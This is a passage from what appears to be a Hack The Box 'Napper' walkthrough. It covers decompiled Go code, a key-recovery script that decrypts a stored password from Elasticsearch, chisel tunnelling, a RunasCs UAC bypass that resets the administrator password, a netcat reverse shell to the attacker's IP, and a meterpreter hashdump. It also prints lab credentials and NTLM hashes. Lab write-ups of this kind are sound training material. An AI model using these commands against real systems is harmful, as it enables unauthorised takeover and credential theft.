    uVar3 = extraout_RBX_01;
    uVar4 = extraout_R8_00;
    uVar5 = extraout_R9_00;
    uVar6 = extraout_R10_00;
    uVar7 = extraout_R11_00;
  }
  local_148 = 1;
  local_140 = 1;
                    /* /Users/remco/git/HTB/es_napper.go:89 */
                    /* /Users/remco/git/HTB/es_napper.go:90 */
                    /* /Users/remco/git/HTB/es_napper.go:91 */
  local_58 = &go:itab.*net/http.Transport,net/http.RoundTripper;
                    /* /Users/remco/git/HTB/es_napper.go:97 */
  runtime.duffcopy_0x130_runtime.duffcopy_00466696((uint4 *)&stack0xfffffffffffffc08,local_150);
  github.com/elastic/go-elasticsearch/v8.NewClient
            (extraout_RAX_01,uVar3,uVar2,extraout_RDI,extraout_RSI,uVar4,uVar5,uVar6,uVar7,
             in_stack_fffffffffffffc08,in_stack_fffffffffffffc10,in_stack_fffffffffffffc18,
             in_stack_fffffffffffffc20,in_stack_fffffffffffffc28,in_stack_fffffffffffffc30,
             in_stack_fffffffffffffc38,in_stack_fffffffffffffc40,in_stack_fffffffffffffc48,
             in_stack_fffffffffffffc50,in_stack_fffffffffffffc58,in_stack_fffffffffffffc60,
             in_stack_fffffffffffffc68,in_stack_fffffffffffffc70,in_stack_fffffffffffffc78,
             in_stack_fffffffffffffc80,in_stack_fffffffffffffc88,in_stack_fffffffffffffc90,
             in_stack_fffffffffffffc98,in_stack_fffffffffffffca0,in_stack_fffffffffffffca8,
             in_stack_fffffffffffffcb0,in_stack_fffffffffffffcb8,in_stack_fffffffffffffcc0,
             in_stack_fffffffffffffcc8,in_stack_fffffffffffffcd0,in_stack_fffffffffffffcd8,
             in_stack_fffffffffffffce0,in_stack_fffffffffffffce8);
                    /* /Users/remco/git/HTB/es_napper.go:99 */
  (***(code ***)(*(int *)(extraout_RAX_04 + 0x40) + 0x1b8))("seed",4,&DAT_00a24228,1,0,0,0);
                    /* /Users/remco/git/HTB/es_napper.go:100 */
  if (extraout_RBX_02 != 0) {
    local_220._0_8_ = extraout_RBX_02;
                    /* /Users/remco/git/HTB/es_napper.go:101 */
    if (extraout_RBX_02 != 0) {
      local_220._0_8_ = *(int *)(extraout_RBX_02 + 8);
    }
    local_220._8_8_ = extraout_RCX_00;
    log.Fatalf("Error getting response: %s",0x1a,local_220,1,1);
                    /* /Users/remco/git/HTB/es_napper.go:103 */
  }
  local_1d8 = *(undefined (*) [16])(extraout_RAX_05 + 0x10);
  local_1e0 = main.main.func1;
  local_20 = &local_1e0;
                    /* /Users/remco/git/HTB/es_napper.go:105 */
  runtime.newobject(&main.Seed___runtime.structtype);
                    /* /Users/remco/git/HTB/es_napper.go:106 */
  uVar2 = *(undefined8 *)(extraout_RAX_05 + 0x18);
  runtime.convI2I(&io.Reader___runtime.interfacetype,*(undefined8 *)(extraout_RAX_05 + 0x10));
                    /* /usr/local/opt/go/libexec/src/io/ioutil/ioutil.go:27 */
  io.ReadAll(extraout_RAX_07,uVar2);
                    /* /Users/remco/git/HTB/es_napper.go:107 */
  encoding/json.Unmarshal
            (extraout_RAX_08,extraout_RBX_03,extraout_RCX_01,&*main.Seed___runtime.ptrtype,
             extraout_RAX_06);
                    /* /Users/remco/git/HTB/es_napper.go:108 */
  if (extraout_RAX_09 != 0) {
    local_220._0_8_ = extraout_RAX_09;
                    /* /Users/remco/git/HTB/es_napper.go:109 */
    if (extraout_RAX_09 != 0) {
      local_220._0_8_ = *(int *)(extraout_RAX_09 + 8);
    }
    local_220._8_8_ = extraout_RBX_04;
    log.Fatalf("Error getting response: %s",0x1a,local_220,1,1);
                    /* /Users/remco/git/HTB/es_napper.go:110 */
    (**local_20)();
    return;
  }
                    /* /Users/remco/git/HTB/es_napper.go:38 */
  main.randStringList(0x28);
                    /* /Users/remco/git/HTB/es_napper.go:148 */
                    /* /Users/remco/git/HTB/es_napper.go:115 */
  main.genKey(*(undefined8 *)(extraout_RAX_06 + 0x40));
                    /* /Users/remco/git/HTB/es_napper.go:117 */
  main.encrypt(extraout_RAX_11,extraout_RBX_06,extraout_RCX_02,extraout_RAX_10,extraout_RBX_05);
                    /* /Users/remco/git/HTB/es_napper.go:131 */
                    /* /Users/remco/git/HTB/es_napper.go:119 */
  (***(code ***)(*(int *)(*(int *)(extraout_RAX_04 + 0x40) + 0x10) + 0x30))("user-00001",10,0,0,0);
                    /* /Users/remco/git/HTB/es_napper.go:120 */
  if (extraout_RBX_07 != 0) {
    local_220._0_8_ = extraout_RBX_07;
                    /* /Users/remco/git/HTB/es_napper.go:121 */
    if (extraout_RBX_07 != 0) {
      local_220._0_8_ = *(int *)(extraout_RBX_07 + 8);
    }
    local_220._8_8_ = extraout_RCX_03;
    log.Fatalf("Error getting response: %s",0x1a,local_220,1,1);
                    /* /Users/remco/git/HTB/es_napper.go:122 */
    (**local_20)();
    return;
  }
                    /* /Users/remco/git/HTB/es_napper.go:119 */
                    /* /Users/remco/git/HTB/es_napper.go:125 */
  local_1f0 = *(undefined (*) [16])(extraout_RAX_12 + 0x10);
  local_1f8 = main.main.func2;
  local_10 = &local_1f8;
                    /* /Users/remco/git/HTB/es_napper.go:132 */
  time.Now();
                    /* /Users/remco/git/HTB/es_napper.go:127 */
                    /* /Users/remco/git/HTB/es_napper.go:131 */
                    /* /Users/remco/git/HTB/es_napper.go:132 */
                    /* /Users/remco/git/HTB/es_napper.go:135 */
  runtime.convT(&
                struct_{_Blob_string_"json:\"blob\"";_Timestamp_time.Time_"json:\"timestamp\""_}___r untime.structtype
                ,local_1c8);
  encoding/json.Marshal
            (&
             struct_{_Blob_string_"json:\"blob\"";_Timestamp_time.Time_"json:\"timestamp\""_}___runt ime.structtype
             ,extraout_RAX_13);
                    /* /Users/remco/git/HTB/es_napper.go:136 */
  if (extraout_RDI_00 != 0) {
    local_230._0_8_ = extraout_RDI_00;
                    /* /Users/remco/git/HTB/es_napper.go:137 */
    if (extraout_RDI_00 != 0) {
      local_230._0_8_ = *(int *)(extraout_RDI_00 + 8);
    }
    local_230._8_8_ = extraout_RSI_00;
                    /* /usr/local/opt/go/libexec/src/fmt/print.go:314 */
    fmt.Fprintln(&go:itab.*os.File,io.Writer,os.Stdout,local_230,1,1);
                    /* /Users/remco/git/HTB/es_napper.go:138 */
    (**local_10)();
    (**local_20)();
    return;
  }
                    /* /Users/remco/git/HTB/es_napper.go:140 */
  runtime.slicebytetostring(0,extraout_RAX_14,extraout_RBX_08);
                    /* /usr/local/opt/go/libexec/src/strings/reader.go:160 */
  runtime.newobject(&strings.Reader___runtime.structtype);
  extraout_RAX_16[1] = extraout_RBX_09;
  if (runtime.writeBarrier == 0) {
    *extraout_RAX_16 = extraout_RAX_15;
    puVar1 = extraout_RAX_16;
  }
  else {
    runtime.gcWriteBarrierCX();
    puVar1 = extraout_RAX_17;
  }
  puVar1[2] = 0;
  puVar1[3] = 0xffffffffffffffff;
                    /* /Users/remco/git/HTB/es_napper.go:140 */
  (***(code ***)(*(int *)(extraout_RAX_04 + 0x40) + 0x1f0))
            ("user-00001",10,&go:itab.*strings.Reader,io.Reader,puVar1,0,0,0);
                    /* /Users/remco/git/HTB/es_napper.go:141 */
  if (extraout_RBX_10 != 0) {
    local_220._0_8_ = extraout_RBX_10;
                    /* /Users/remco/git/HTB/es_napper.go:142 */
    if (extraout_RBX_10 != 0) {
      local_220._0_8_ = *(int *)(extraout_RBX_10 + 8);
    }
    local_220._8_8_ = extraout_RCX_04;
    log.Fatalf("Error getting response: %s",0x1a,local_220,1,1);
                    /* /Users/remco/git/HTB/es_napper.go:143 */
    (**local_10)();
    (**local_20)();
    return;
  }
                    /* /Users/remco/git/HTB/es_napper.go:146 */
  local_208 = *(undefined (*) [16])(extraout_RAX_12 + 0x10);
  local_210 = main.main.func3;
  ppcStack_18 = &local_210;
                    /* /Users/remco/git/HTB/es_napper.go:148 */
  runtime.duffzero_0x30_0x80_runtime.duffzero_004663f0((uint4 *)(local_1d8 + 8),(uint16)auVar8);
  local_1a0 = "/c";
  local_198 = 2;
  local_190 = "net";
  local_188 = 3;
  local_180 = "user";
  local_178 = 4;
  local_170 = "backup";
  local_168 = 6;
  os/exec.Command("C:\\Windows\\System32\\cmd.exe",0x1b,&local_1a0,5,5);
                    /* /Users/remco/git/HTB/es_napper.go:150 */
  os/exec.(*Cmd).CombinedOutput(extraout_RAX_18);
                    /* /Users/remco/git/HTB/es_napper.go:152 */
  if (extraout_RDI_01 != 0) {
    local_220._0_8_ = extraout_RDI_01;
                    /* /Users/remco/git/HTB/es_napper.go:153 */
    if (extraout_RDI_01 != 0) {
      local_220._0_8_ = *(int *)(extraout_RDI_01 + 8);
    }
    local_220._8_8_ = extraout_RSI_01;
    log.Fatal(local_220,1,1);
  }
                    /* /Users/remco/git/HTB/es_napper.go:155 */
  (**ppcStack_18)();
  (**local_10)();
  (**local_20)();
  return;
}
```

`m` > `ma` > `main.` > `main.encrypt - (a.exe)`

```c
/* Name: main.encrypt
   Start: 00870200
   End: 008703e0 */

void main.encrypt(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,
                 undefined8 param_5)

{
  uint uVar1;
  undefined8 extraout_RAX;
  undefined8 extraout_RAX_00;
  int extraout_RAX_01;
  int extraout_RAX_02;
  undefined8 extraout_RCX;
  int extraout_RCX_00;
  undefined8 extraout_RCX_01;
  undefined8 uVar2;
  int extraout_RBX;
  undefined8 extraout_RBX_00;
  int extraout_RBX_01;
  undefined8 extraout_RBX_02;
  int iVar3;
  undefined8 extraout_RDI;
  undefined8 uStack0000000000000008;
  undefined8 uStack0000000000000010;
  undefined8 uStack0000000000000018;
  undefined8 uStack0000000000000020;
  undefined8 in_stack_ffffffffffffff88;
  undefined8 in_stack_ffffffffffffff90;
  
  uStack0000000000000008 = param_1;
  uStack0000000000000018 = param_3;
  uStack0000000000000010 = param_2;
  uStack0000000000000020 = param_4;
                    /* /Users/remco/git/HTB/es_napper.go:59 */
  while (&stack0x00000000 <= CURRENT_G.stackguard0) {
                    /* /Users/remco/git/HTB/es_napper.go:59 */
    runtime.morestack_noctxt();
  }
                    /* /Users/remco/git/HTB/es_napper.go:60 */
  runtime.stringtoslicebyte(0,uStack0000000000000020,param_5);
                    /* /Users/remco/git/HTB/es_napper.go:62 */
  crypto/aes.NewCipher(uStack0000000000000008,uStack0000000000000010,uStack0000000000000018);
                    /* /Users/remco/git/HTB/es_napper.go:63 */
  if (extraout_RCX_00 != 0) {
                    /* /Users/remco/git/HTB/es_napper.go:64 */
    if (extraout_RCX_00 != 0) {
                    /* /Users/remco/git/HTB/es_napper.go:64 */
      uVar2 = *(undefined8 *)(extraout_RCX_00 + 8);
    }
    else {
      uVar2 = 0;
    }
                    /* WARNING: Subroutine does not return */
    runtime.gopanic(uVar2,extraout_RDI);
  }
                    /* /Users/remco/git/HTB/es_napper.go:62 */
                    /* /Users/remco/git/HTB/es_napper.go:67 */
  uVar1 = extraout_RBX + 0x10;
  runtime.makeslice(&uint8___runtime._type,uVar1,uVar1);
                    /* /Users/remco/git/HTB/es_napper.go:68 */
  if (uVar1 < 0x10) {
                    /* /Users/remco/git/HTB/es_napper.go:68 */
                    /* WARNING: Subroutine does not return */
    runtime.panicSliceAcap(in_stack_ffffffffffffff88,in_stack_ffffffffffffff90);
  }
                    /* /Users/remco/git/HTB/es_napper.go:67 */
                    /* /Users/remco/git/HTB/es_napper.go:70 */
                    /* /usr/local/opt/go/libexec/src/io/io.go:351 */
  io.ReadAtLeast(crypto/rand.Reader,DAT_00ca8bb8,extraout_RAX_01,0x10,uVar1,0x10);
                    /* /Users/remco/git/HTB/es_napper.go:70 */
  if (extraout_RBX_01 == 0) {
                    /* /usr/local/opt/go/libexec/src/crypto/cipher/cfb.go:57 */
    crypto/cipher.newCFB(extraout_RAX_00,extraout_RBX_00,extraout_RAX_01,0x10,uVar1,0);
                    /* /Users/remco/git/HTB/es_napper.go:75 */
    (**(code **)(extraout_RAX_02 + 0x18))
              (extraout_RBX_02,extraout_RAX_01 + (uint)((dword)(-extraout_RBX >> 0x3f) & 0x10),
               extraout_RBX,extraout_RBX,extraout_RAX,extraout_RBX,extraout_RCX);
                    /* /Users/remco/git/HTB/es_napper.go:77 */
    encoding/base64.(*Encoding).EncodeToString
              (encoding/base64.URLEncoding,extraout_RAX_01,uVar1,uVar1);
    return;
  }
  iVar3 = extraout_RBX_01;
                    /* /Users/remco/git/HTB/es_napper.go:71 */
  if (extraout_RBX_01 != 0) {
    iVar3 = *(int *)(extraout_RBX_01 + 8);
  }
                    /* WARNING: Subroutine does not return */
  runtime.gopanic(iVar3,extraout_RCX_01);
}
```

`m` > `ma` > `main.` > `main.genKey - (a.exe)`

```c
// the paramter is the seed
void main.genKey(undefined8 param_1)
{
  // key variable
  char extraout_AL;
  int extraout_RAX;
  int iVar1;

  while (&stack0x00000000 <= CURRENT_G.stackguard0) 
  {
    runtime.morestack_noctxt();
  }

 // generate random seed, the function is vulnerable
  math/rand.(Rand).Seed(math/rand.globalRand,param_1);

  // allocate 16 bytes on the heap
  // equalvalent to: make([]byte, 16)
  runtime.makeslice(&uint8___runtime._type,0x10,0x10);

  // 0x10 = 16, our key has 16 bytes !!
  for (iVar1 = 0; iVar1 < 0x10; iVar1 = iVar1 + 1) {
    // generate random number between 0 and 0xfe = 254
    math/rand.(Rand).Intn(math/rand.globalRand,0xfe); 

    // add 1 to the random number
    // convert the number to a byte and store it in the key
    (char)(extraout_RAX + iVar1) = extraout_AL + '\x01';
  }
  return;
}
```

> https://stackoverflow.com/questions/12321133/how-to-properly-seed-random-number-generator

Shoutout to `AROx4444` this sick fucker did it!!

```c
┌──(user㉿kali)-[/media/…/htb/machines/napper/files]
└─$ cat decrypt.go 
package main

import (
        "crypto/aes"
        "crypto/cipher"
        "encoding/base64"
        "encoding/json"
        "fmt"
        "io/ioutil"
        "math/rand"
        "net/http"
        "strconv"
        "strings"
        "crypto/tls"
)

func getBlobAndSeed() (string, string, error) {
        url := "https://127.0.0.1:9200/_search"
        username := "elastic"
        password := "oKHzjZw0EGcRxT2cux5K"
        tr := &http.Transport{
                TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        }
        client := &http.Client{Transport: tr}
        req, err := http.NewRequest("GET", url, nil)
        if err != nil {
                return "", "", err
        }
        req.SetBasicAuth(username, password)
        resp, err := client.Do(req)
        if err != nil {
                return "", "", err
        }
        defer resp.Body.Close()
        body, err := ioutil.ReadAll(resp.Body)
        if err != nil {
                return "", "", err
        }
        var response struct {
                Hits struct {
                        Hits []struct {
                                Source struct {
                                        Seed json.Number `json:"seed"`
                                        Blob string      `json:"blob"`
                                } `json:"_source"`
                        } `json:"hits"`
                } `json:"hits"`
        }
        err = json.Unmarshal(body, &response)
        if err != nil {
                return "", "", err
        }
        var seed, blob string
        if len(response.Hits.Hits) > 0 {
                seed = response.Hits.Hits[0].Source.Seed.String()
                blob = response.Hits.Hits[1].Source.Blob
        }

        return seed, blob, nil
}

func recoverKey(seedStr string) []byte {
        seed, err := strconv.Atoi(seedStr)
        if err != nil {
                panic(err)
        }

        key := make([]byte, 0, 16)
        rand.Seed(int64(seed))
        for i := 0; i < 0x10; i++ {
                val := rand.Intn(0xfe)
                key = append(key, byte(val+1))
        }
        return key
}

func decrypt(ciphertext, key, iv []byte) ([]byte, error) {
        block, err := aes.NewCipher(key)
        if err != nil {
                return nil, err
        }
        if len(iv) != aes.BlockSize {
                return nil, fmt.Errorf("IV length must equal block size")
        }
        if len(ciphertext) < aes.BlockSize {
                return nil, fmt.Errorf("ciphertext is too short")
        }
        stream := cipher.NewCFBDecrypter(block, iv)
        stream.XORKeyStream(ciphertext, ciphertext)
        return ciphertext, nil
}

func main() {
        seed, blob, err := getBlobAndSeed()
        if err != nil {
                fmt.Println("Error:", err)
                return
        }

        fmt.Println("Seed:", seed)
        fmt.Println("Blob:", blob)

        key := recoverKey(seed)
        decoded, err := base64.URLEncoding.DecodeString(strings.TrimSpace(blob))
        if err != nil {
                panic(err)
        }

        cipherText := decoded[aes.BlockSize:]
        iv := decoded[:aes.BlockSize]
        decryptedData, err := decrypt(cipherText, key, iv)
        if err != nil {
                panic(err)
        }

        fmt.Println("Password:", string(decryptedData))
}
```

I updated my forwarding.

```c
┌──(user㉿kali)-[/media/…/htb/machines/napper/serve]
└─$ ./chisel_server server -p 9003 -reverse -v
2023/11/13 21:42:19 server: Reverse tunnelling enabled
2023/11/13 21:42:19 server: Fingerprint 0k1vl1JOluJmUMygBBGbdfTHHHZH2zQ87UtKY6HI510=
2023/11/13 21:42:19 server: Listening on http://0.0.0.0:9003
```

```c
PS C:\Temp> ./chisel_client.exe client 10.10.16.42:9003 R:9200:127.0.0.1:9200
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/napper/files]
└─$ go run decrypt.go        
Seed: 60964154
Blob: ZpoSkxnYgU0_qX6LR4SPyygBuxu2xqSPLY_YIJ6IiqqROWPCZN7B0-zrfE3KWfloXMe8pggqPFw=
Password: QPwHyaMGhkGySNhMJVpLBHunZbfVHbJgXDwziIqg
```

> https://github.com/antonioCoco/RunasCs

```c
PS C:\Temp> .\RunasCs.exe backup ueuawEWZFTdYJmQJjutaHLxCtKwSpepIIgZSFItr "net user administrator Foobar2023!!" --bypass-uac
```

```c
PS C:\Temp> .\RunasCs.exe administrator 'Foobar2023!!' "cmd /c whoami /all"
.\RunasCs.exe administrator 'Foobar2023!!' "cmd /c whoami /all"


USER INFORMATION
----------------

User Name            SID                                          
==================== =============================================
napper\administrator S-1-5-21-1567175541-2888103920-4161894620-500


GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes                                                     
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group             
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group             
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group             
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288                                                                


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

```c
PS C:\Temp> .\RunasCs.exe administrator Foobar2023!! "nc64.exe 10.10.16.42 6969 -e cmd.exe"
.\RunasCs.exe administrator Foobar2023!! "nc64.exe 10.10.16.42 6969 -e cmd.exe"
```

```c
┌──(user㉿kali)-[~]
└─$ nc -lnvp 6969
listening on [any] 6969 ...
connect to [10.10.16.42] from (UNKNOWN) [10.129.5.130] 59544
Microsoft Windows [Version 10.0.19045.3636]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## root.txt

```c
C:\Users\Administrator\Desktop>type root.txt
type root.txt
82ce44082155ff2fbe17629d38a63c8e
```

## Post Exploitation Tasks

```c
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85b68580ebe65402c4b5d9f840d08ae7:::
backup:1003:aad3b435b51404eeaad3b435b51404ee:22a50ac6f43e1121c28afc6f9349be70:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
example:1002:aad3b435b51404eeaad3b435b51404ee:4da4a64845e9fbf07e0f7e236ca82694:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ruben:1001:aad3b435b51404eeaad3b435b51404ee:ae5917c26194cec4fc402490c7a919a7:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:49c2f41a954679b5f3a7ef12deab11e4:::
```
